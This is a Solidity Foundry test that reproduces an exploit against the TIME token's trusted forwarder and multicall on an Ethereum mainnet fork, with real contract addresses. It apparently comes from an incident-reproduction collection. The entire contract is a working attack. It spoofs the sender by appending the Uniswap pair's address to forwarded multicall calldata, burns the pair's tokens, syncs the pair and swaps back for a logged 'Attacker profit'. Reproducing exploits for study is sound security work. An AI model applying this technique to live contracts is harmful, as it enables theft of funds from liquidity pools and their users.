// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";
import "contracts/231206_TIME/Forwarder/Forwarder.sol";

interface ITIME is IERC20 {
    function burn(uint256 amount) external;

    function multicall(
        bytes[] memory data
    ) external returns (bytes[] memory results);
}

contract TIMEAttacker is Test {
    ITIME constant time = ITIME(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
    IERC20 constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair constant time_weth = IUniswapV2Pair(0x760dc1E043D99394A10605B2FA08F123D60faF84);
    IUniswapV2Router constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Forwarder constant forwarder = Forwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);

    address addr;
    uint256 privateKey;

    function setUp() public {
        vm.createSelectFork("eth");
        vm.label(address(time), "TIME");
        vm.label(address(weth), "WETH");
        vm.label(address(time_weth), "UniswapV2Pair: TIME-WETH");
        vm.label(address(router), "Router");
        vm.label(address(forwarder), "Forwarder");

        (addr, privateKey) = makeAddrAndKey("attacker");
    }

    function testExploit() public {
        vm.startPrank(addr, addr);
        uint attackBlockNumber = 18730462;
        vm.rollFork(attackBlockNumber);
        deal(address(weth), address(addr), 5 ether);
        uint256 wethBalanceBefore = weth.balanceOf(address(addr));
        emit log_named_decimal_uint("WETH balance before attack", wethBalanceBefore, 18);
        time.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        WETHToTIME();

        emit log_named_decimal_uint("Pair TIME balance", time.balanceOf(address(time_weth)), time.decimals());

        // construct calldata
        uint256 burnAmount = time.balanceOf(address(time_weth)) - 1e18;
        bytes memory burnData = abi.encodeWithSelector(ITIME.burn.selector, burnAmount);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodePacked(burnData, address(time_weth));
        bytes memory multicallData = abi.encodeWithSelector(ITIME.multicall.selector, data);

        // construct ForwardRequest
        bytes32 TYPEHASH = keccak256("ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)");
        Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest({
            from: address(addr),
            to: address(time),
            value: 0,
            gas: 5e6,
            nonce: 0,
            data: multicallData
        });
        // construct signature
        bytes32 structHash = keccak256(abi.encode(TYPEHASH, req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data)));
        bytes32 _CACHED_DOMAIN_SEPARATOR= hex"7ce8d495cdbd0e4deb3abed5528be0aca8dae1c9f4172364ceec32c5051da6b8";
        bytes32 messageHash = ECDSA.toTypedDataHash(_CACHED_DOMAIN_SEPARATOR, structHash);
        (uint8 v, bytes32 r, bytes32 s) =  vm.sign(privateKey, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(req, signature);
        time_weth.sync();
        emit log_named_decimal_uint("Pair TIME balance", time.balanceOf(address(time_weth)), time.decimals());

        TIMEToWETH();
        uint256 wethBalanceAfter = weth.balanceOf(address(addr));
        emit log_named_decimal_uint("WETH balance after attack", wethBalanceAfter, 18);
        emit log_named_decimal_uint("Attacker profit", wethBalanceAfter - wethBalanceBefore, 18);
        vm.stopPrank();
    }


    function WETHToTIME() internal {
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(time);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            weth.balanceOf(address(addr)),
            0,
            path,
            address(addr),
            block.timestamp
        );
    }

    function TIMEToWETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(time);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            time.balanceOf(address(addr)),
            0,
            path,
            address(addr),
            block.timestamp
        );
    }
}
